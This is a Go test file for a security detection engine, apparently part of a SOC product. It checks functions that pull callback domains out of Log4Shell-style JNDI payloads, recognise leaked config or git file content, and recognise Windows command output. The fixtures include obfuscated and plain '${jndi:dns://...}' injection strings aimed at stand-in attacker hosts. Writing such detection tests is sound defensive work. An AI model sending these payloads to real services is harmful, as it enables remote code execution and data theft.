package evaluate

import (
	"reflect"
	"testing"

	"justsoc/engine/internal/normalize"
)

func TestCallbackDomains(t *testing.T) {
	event := normalize.ThreatEvent{
		PayloadPrintable: "GET /?x=${${lower:j}${lower:n}${lower:d}${lower:i}:dns://obf.attacker.test/a} HTTP/1.1",
		HTTPURL:          "/?x=${jndi:dns://abcd.attacker.test/a}",
	}
	got := callbackDomains(event)
	want := []string{"obf.attacker.test", "abcd.attacker.test"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("callbackDomains() = %v, want %v", got, want)
	}
}

func TestContainsSensitiveFileContent(t *testing.T) {
	event := normalize.ThreatEvent{EventOriginal: "spring.datasource.url=jdbc:mysql://db.internal:3306/app\nrepositoryformatversion = 0"}
	if !containsSensitiveFileContent(event) {
		t.Fatalf("expected sensitive file content to be detected")
	}
}

func TestContainsCommandOutput(t *testing.T) {
	event := normalize.ThreatEvent{EventOriginal: "Microsoft Windows [Version 10.0.19045.0]\r\nDirectory of C:\\inetpub\\wwwroot\r\nNT AUTHORITY\\SYSTEM"}
	if !containsCommandOutput(event) {
		t.Fatalf("expected command output to be detected")
	}
}
